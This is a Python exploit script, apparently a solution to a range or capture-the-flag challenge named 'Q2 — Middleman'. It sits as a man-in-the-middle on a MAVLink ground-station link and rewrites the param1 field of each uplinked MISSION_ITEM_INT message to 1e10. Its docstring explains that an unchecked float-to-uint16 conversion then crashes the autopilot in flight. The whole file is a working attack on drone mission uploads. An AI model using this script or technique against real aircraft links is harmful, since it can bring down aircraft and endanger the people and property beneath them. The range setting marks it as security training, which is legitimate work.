#!/usr/bin/env python3
"""Q2 — Middleman.

The ground station re-uploads its mission once a minute. That upload crosses
the link as a plain sequence of MISSION_ITEM_INT messages with no signature
worth the name, so we get to edit it in transit.

`param1` is carried as a 32-bit float and, for several commands, converted
straight into a uint16 on the far side without a range check. Hand it a value
that cannot fit and the conversion faults. The autopilot process does not
handle the fault; it dies, mid-flight, holding the aircraft.

We change exactly one number. Everything else is forwarded untouched.

    python3 q2_middleman.py --host <range-host> --port 14580
"""
import argparse
import sys
import time

from tap import DOWNLINK, UPLINK, Tap

# 1e10 cannot be represented in a uint16. The float->int conversion on the
# flight controller is unchecked, and the resulting fault is fatal.
POISON = 1e10

MISSION_ITEM_INT = "MISSION_ITEM_INT"


def log(msg):
    print(f"[*] {msg}", flush=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=14580)
    ap.add_argument("--value", type=float, default=POISON)
    args = ap.parse_args()

    log(f"attaching to the tap at {args.host}:{args.port}")
    tap = Tap(args.host, args.port)
    log("attached — the link is ours; forwarding everything until a mission appears")

    poisoned = 0
    started = time.time()

    try:
        for direction, data in tap.frames():
            if direction != UPLINK:
                tap.send(DOWNLINK, data)
                continue

            msgs = tap.decode(UPLINK, data)
            targets = [m for m in msgs if m.get_type() == MISSION_ITEM_INT]

            if not targets:
                # Not our business. Forward the original bytes verbatim so we
                # do not disturb anything we do not understand.
                tap.send(UPLINK, data)
                continue

            for m in targets:
                original = m.param1
                m.param1 = args.value
                poisoned += 1
                log(f"mission item seq={m.seq} cmd={m.command} "
                    f"param1 {original} -> {args.value}")

            tap.send(UPLINK, tap.encode(UPLINK, msgs))

            if poisoned:
                log(f"poisoned {poisoned} item(s) after "
                    f"{time.time() - started:.0f}s — watching the link")
    except KeyboardInterrupt:
        pass
    finally:
        tap.close()

    log("relay closed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
